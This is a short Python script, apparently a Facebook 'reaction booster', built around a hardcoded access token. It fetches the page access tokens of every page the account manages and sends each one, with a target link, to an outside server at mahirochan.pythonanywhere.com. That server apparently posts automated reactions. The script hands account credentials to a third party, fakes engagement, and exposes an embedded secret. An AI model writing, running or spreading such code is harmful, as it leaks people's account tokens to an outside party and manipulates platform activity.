#Credit to: Mahîro chan
import requests
import time
 
access_tokens = ["EAAAAUaZA82IABO6J3L2J0sSGdWYT1vZCMx4nQixfnpxiB72wnhlIMiZB5M3M3kNoTZCqZBxetKU9nqz0IlSrd1hIDHhFZCEO7KoCzOgO8JAippd6iJJ5E60JE2I22KXJqfm2qMgMmeRdSZCSsGGHhwRCM70hzbDkjX85WF8Clo5khuZCWITNJNyWakqxpXHZBkaYzZAL184tiCFx2NNd8FdVgZDZD"]
 
link = input('Enter your target link: ') #FBlite link only or it might not work.
reaction_type = input('Enter your reaction: ')
 
try:
    for access_token in access_tokens:
        response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()
 
        for page in response.get('data', []):
            page_access_token = page.get('access_token', '')
            page_name = page.get('name', '')
            try:
                response = requests.get(f'https://mahirochan.pythonanywhere.com/api', params={'reaction_type': reaction_type.upper(), 'link': link, 'access_token': page_access_token})
                print(f'Success reaction using {page_name} {response.json()}')
            except requests.exceptions.RequestException as error:
                print(f'Error for {page_name}: {error}')
except Exception as e:
    print(f'An unexpected error occurred: {e}')